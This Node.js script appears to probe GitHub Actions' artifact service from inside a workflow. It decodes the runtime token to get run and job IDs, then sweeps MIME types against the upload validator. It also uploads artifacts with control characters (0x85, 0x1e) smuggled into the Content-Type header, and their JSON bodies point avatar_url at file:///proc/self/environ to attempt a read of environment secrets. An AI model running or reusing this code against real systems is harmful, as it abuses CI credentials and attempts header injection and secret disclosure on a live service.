const fs = require('fs');
const crypto = require('crypto');
(async () => {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const scp = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8')).scp;
  const parts = scp.split(' ').find(s => s.startsWith('Actions.Results:')).split(':');
  const runId = parts[1], jobId = parts[2];
  const specs = JSON.parse(process.env.INPUT_SPECS || '[]');
  const putctSpecs = JSON.parse(process.env.INPUT_PUTCTS || '[]');
  const out = { artifacts: [] };
  async function create(name, mime) {
    const r = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
      body: JSON.stringify({ workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, mime_type: mime, version: 7 })
    });
    const j = await r.json().catch(() => ({}));
    return { status: r.status, up: j.signedUploadUrl || j.signed_upload_url, err: j.msg || j.message || JSON.stringify(j).slice(0, 120) };
  }
  // A. mime validator map
  let i = 0;
  for (const m of specs) {
    i++;
    const c = await create('m' + i + '.json', m);
    console.log('MIME', i, JSON.stringify(m), '->', c.status, c.up ? 'ACCEPT' : ('REJECT: ' + c.err));
    if (c.up) out.artifacts.push({ name: 'm' + i + '.json', up: c.up });
  }
  // B. node-built raw \x85 stored CT
  let k = 0;
  for (const ct of putctSpecs) {
    k++;
    const name = 'x' + k + '.json';
    const c = await create(name, 'application/json');
    if (!c.up) { console.log('PUTCT', k, 'create failed'); continue; }
    const payload = Buffer.from('{"full_name":"p' + k + '","owner":{"login":"u","avatar_url":"file:///proc/self/environ"}}');
    const ctv = ct.split(',').map(x => x === '85' ? String.fromCharCode(0x85) : x === '1e' ? String.fromCharCode(0x1e) : x).join('');
    const pr = await fetch(c.up, { method: 'PUT', headers: { 'Content-Type': ctv, 'x-ms-blob-type': 'BlockBlob' }, body: payload });
    const fr = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
      body: JSON.stringify({ workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, size: String(payload.length), hash: 'sha256:' + crypto.createHash('sha256').update(payload).digest('hex') })
    });
    const fj = await fr.json().catch(() => ({}));
    console.log('PUTCT', k, 'ct=', JSON.stringify(ctv), 'PUT', pr.status, 'FIN', fr.status, 'artifactId', fj.artifact_id || fj.artifactId);
    out.artifacts.push({ name, artifactId: fj.artifact_id || fj.artifactId, ctv });
  }
  fs.writeFileSync('/tmp/probe4_state.json', JSON.stringify(out, null, 2));
  console.log('DONE artifacts=' + out.artifacts.length);
})().catch(e => { console.log('ERR ' + e.message); process.exit(1); });
